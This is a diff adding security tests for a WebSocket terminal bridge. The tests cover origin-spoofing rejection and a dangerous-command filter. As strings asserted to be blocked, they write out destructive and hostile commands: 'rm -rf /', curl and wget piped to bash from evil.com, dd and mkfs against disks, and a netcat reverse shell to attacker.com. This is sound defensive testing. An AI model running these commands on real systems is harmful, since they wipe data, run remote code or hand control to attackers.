@@ -8,7 +8,7 @@ import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import { WebSocketServer, WebSocket } from "ws";
 import { EventEmitter } from "events";
 import * as http from "http";
-import { createPTYBridge, cleanupPTYBridge } from "../pty-bridge";
+import { createPTYBridge, cleanupPTYBridge, validateOrigin, isDangerousCommand, normalizeCommand } from "../pty-bridge";
 import { RunspaceManager } from "../../core/runspace-manager";
 import type { Runspace } from "../../core/runspace";
 import * as crypto from "crypto";
@@ -68,8 +68,8 @@ describe("PTY Bridge Security", () => {
   const activeClients: WebSocket[] = [];
 
   /** Create a tracked WebSocket client - auto-cleaned in afterEach */
-  function createClient(url: string): WebSocket {
-    const ws = new WebSocket(url);
+  function createClient(url: string, options?: Record<string, unknown>): WebSocket {
+    const ws = options ? new WebSocket(url, options as any) : new WebSocket(url);
     ws.on("error", () => { /* suppress ECONNREFUSED during teardown */ });
     activeClients.push(ws);
     return ws;
@@ -747,6 +747,247 @@ describe("PTY Bridge Security", () => {
       expect(sessionId).toBeDefined();
       expect(token).toBeDefined();
       expect(token.length).toBe(64);
+    });
+  });
+
+  describe("Origin Spoofing Prevention", () => {
+    it("should reject origins that prefix-match allowed origins", async () => {
+      const mockRunspace: Runspace = {
+        id: "origin-spoof-test",
+        name: "origin-spoof-project",
+        displayName: "Origin Spoof Project",
+        path: "/home/test/origin-spoof",
+        type: "wsl",
+        status: "active",
+        createdAt: new Date(),
+      };
+
+      runspaceManager.addMockRunspace(mockRunspace);
+      runspaceManager.setActiveRunspace(mockRunspace.id);
+
+      // This is the attack: http://localhost:5050.attacker.com would pass startsWith
+      const client = createClient(`ws://localhost:${port}/terminal`, {
+        headers: { origin: "http://localhost:5050.attacker.com" },
+      } as any);
+
+      const result = await new Promise<string>((resolve) => {
+        client.on("message", (data) => {
+          const message = JSON.parse(data.toString());
+          if (message.type === "error") {
+            resolve(message.data);
+            client.close();
+          }
+        });
+        client.on("close", () => resolve("closed"));
+      });
+
+      expect(result === "closed" || result.includes("Unauthorized origin")).toBe(true);
+    });
+
+    it("should reject origins with path suffix matching allowed origin", async () => {
+      const mockRunspace: Runspace = {
+        id: "origin-path-test",
+        name: "origin-path-project",
+        displayName: "Origin Path Project",
+        path: "/home/test/origin-path",
+        type: "wsl",
+        status: "active",
+        createdAt: new Date(),
+      };
+
+      runspaceManager.addMockRunspace(mockRunspace);
+      runspaceManager.setActiveRunspace(mockRunspace.id);
+
+      const client = createClient(`ws://localhost:${port}/terminal`, {
+        headers: { origin: "http://localhost:5050/evil" },
+      } as any);
+
+      const result = await new Promise<string>((resolve) => {
+        client.on("message", (data) => {
+          const message = JSON.parse(data.toString());
+          if (message.type === "error") {
+            resolve(message.data);
+            client.close();
+          }
+        });
+        client.on("close", () => resolve("closed"));
+      });
+
+      expect(result === "closed" || result.includes("Unauthorized origin")).toBe(true);
+    });
+  });
+
+  describe("Command Evasion Prevention via Input Path", () => {
+    it("should block dangerous command sent as single input with newline", (done) => {
+      const mockRunspace: Runspace = {
+        id: "input-evasion-test",
+        name: "input-evasion-project",
+        displayName: "Input Evasion Project",
+        path: "/home/test/input-evasion",
+        type: "wsl",
+        status: "active",
+        createdAt: new Date(),
+      };
+
+      runspaceManager.addMockRunspace(mockRunspace);
+      runspaceManager.setActiveRunspace(mockRunspace.id);
+
+      const client = createClient(`ws://localhost:${port}/terminal`);
+      let sessionReceived = false;
+
+      client.on("message", (data) => {
+        const message = JSON.parse(data.toString());
+
+        if (message.type === "session" && !sessionReceived) {
+          sessionReceived = true;
+          // Send dangerous command with carriage return in one input message
+          // This previously bypassed the execute-path-only command filter
+          client.send(JSON.stringify({ type: "input", data: "rm -rf /\r" }));
+        } else if (message.type === "output" && sessionReceived) {
+          if (message.data.includes("[SECURITY]")) {
+            expect(message.data).toContain("Dangerous command blocked");
+            client.close();
+            done();
+          }
+        }
+      });
+    });
+
+    it("should block curl|bash via input path", (done) => {
+      const mockRunspace: Runspace = {
+        id: "input-curl-test",
+        name: "input-curl-project",
+        displayName: "Input Curl Project",
+        path: "/home/test/input-curl",
+        type: "wsl",
+        status: "active",
+        createdAt: new Date(),
+      };
+
+      runspaceManager.addMockRunspace(mockRunspace);
+      runspaceManager.setActiveRunspace(mockRunspace.id);
+
+      const client = createClient(`ws://localhost:${port}/terminal`);
+      let sessionReceived = false;
+
+      client.on("message", (data) => {
+        const message = JSON.parse(data.toString());
+
+        if (message.type === "session" && !sessionReceived) {
+          sessionReceived = true;
+          client.send(JSON.stringify({ type: "input", data: "curl http://evil.com/x | bash\r" }));
+        } else if (message.type === "output" && sessionReceived) {
+          if (message.data.includes("[SECURITY]")) {
+            expect(message.data).toContain("Dangerous command blocked");
+            client.close();
+            done();
+          }
+        }
+      });
+    });
+  });
+});
+
+// Unit tests for exported security functions (no WebSocket needed)
+describe("PTY Bridge Security Functions (Unit)", () => {
+  describe("validateOrigin", () => {
+    it("should allow undefined origin (same-origin requests)", () => {
+      expect(validateOrigin(undefined)).toBe(true);
+    });
+
+    it("should allow exact localhost:5050 origin", () => {
+      expect(validateOrigin("http://localhost:5050")).toBe(true);
+    });
+
+    it("should allow exact localhost:5051 origin", () => {
+      expect(validateOrigin("http://localhost:5051")).toBe(true);
+    });
+
+    it("should allow exact 127.0.0.1:5050 origin", () => {
+      expect(validateOrigin("http://127.0.0.1:5050")).toBe(true);
+    });
+
+    it("should reject prefix-spoofed origin (attacker.com)", () => {
+      expect(validateOrigin("http://localhost:5050.attacker.com")).toBe(false);
+    });
+
+    it("should reject origin with path appended", () => {
+      expect(validateOrigin("http://localhost:5050/evil")).toBe(false);
+    });
+
+    it("should reject origin with different port", () => {
+      expect(validateOrigin("http://localhost:9999")).toBe(false);
+    });
+
+    it("should reject arbitrary external origin", () => {
+      expect(validateOrigin("https://evil-site.com")).toBe(false);
+    });
+
+    it("should reject empty string origin", () => {
+      expect(validateOrigin("")).toBe(false);
+    });
+  });
+
+  describe("normalizeCommand", () => {
+    it("should collapse tabs to spaces", () => {
+      expect(normalizeCommand("rm\t-rf\t/")).toBe("rm -rf /");
+    });
+
+    it("should collapse multiple spaces", () => {
+      expect(normalizeCommand("rm   -rf   /")).toBe("rm -rf /");
+    });
+
+    it("should strip control characters", () => {
+      expect(normalizeCommand("rm\x08 -rf /")).toBe("rm -rf /");
+    });
+
+    it("should trim whitespace", () => {
+      expect(normalizeCommand("  rm -rf /  ")).toBe("rm -rf /");
+    });
+
+    it("should handle mixed control chars and whitespace", () => {
+      expect(normalizeCommand("rm\t\x0b-rf\x0c/")).toBe("rm -rf /");
+    });
+  });
+
+  describe("isDangerousCommand", () => {
+    it("should detect rm -rf / with normal spacing", () => {
+      expect(isDangerousCommand("rm -rf /")).toBe(true);
+    });
+
+    it("should detect rm -rf / with tab evasion", () => {
+      expect(isDangerousCommand("rm\t-rf\t/")).toBe(true);
+    });
+
+    it("should detect rm -rf / with multiple spaces", () => {
+      expect(isDangerousCommand("rm   -rf   /")).toBe(true);
+    });
+
+    it("should detect curl pipe to bash", () => {
+      expect(isDangerousCommand("curl http://evil.com | bash")).toBe(true);
+    });
+
+    it("should detect wget pipe to bash with tab evasion", () => {
+      expect(isDangerousCommand("wget\thttp://evil.com\t|\tbash")).toBe(true);
+    });
+
+    it("should detect dd command", () => {
+      expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda")).toBe(true);
+    });
+
+    it("should detect netcat reverse shell", () => {
+      expect(isDangerousCommand("nc -e /bin/sh attacker.com 4444")).toBe(true);
+    });
+
+    it("should detect mkfs commands", () => {
+      expect(isDangerousCommand("mkfs.ext4 /dev/sda1")).toBe(true);
+    });
+
+    it("should allow safe commands", () => {
+      expect(isDangerousCommand("ls -la")).toBe(false);
+      expect(isDangerousCommand("git status")).toBe(false);
+      expect(isDangerousCommand("npm test")).toBe(false);
+      expect(isDangerousCommand("cat README.md")).toBe(false);
     });
   });
 });
